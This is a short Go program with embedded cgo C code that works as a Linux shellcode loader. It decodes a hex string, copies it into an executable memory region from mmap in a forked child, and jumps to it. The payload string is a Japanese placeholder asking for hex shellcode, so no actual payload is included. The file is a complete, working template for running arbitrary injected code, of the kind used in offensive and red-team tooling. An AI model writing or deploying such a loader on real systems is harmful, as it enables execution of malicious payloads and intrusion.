//go:build linux

package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void call(char *shellcode, size_t length) {
        if(fork()) {
                return;
        }
        unsigned char *memory;
        memory = (unsigned char *) mmap(0, length, \
                PROT_READ|PROT_WRITE|PROT_EXEC, \
                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
        if(memory == MAP_FAILED) {
                perror("mmap");
                return;
        }
        memcpy(memory, shellcode, length);
        ( *(void(*) ()) memory)();
}
*/
import "C"
import (
        "encoding/hex"
        "unsafe"
)

func main() {
        shellCodeStr := "16進数文字列のシェルコードを入力"
        shellCodeBin, err := hex.DecodeString(shellCodeStr)
        if err != nil {
                return
        }

        run(shellCodeBin)
}

func run(shellCodeBin []byte) {
        C.call((*C.char)(unsafe.Pointer(&shellCodeBin[0])),
                (C.size_t)(len(shellCodeBin)))
}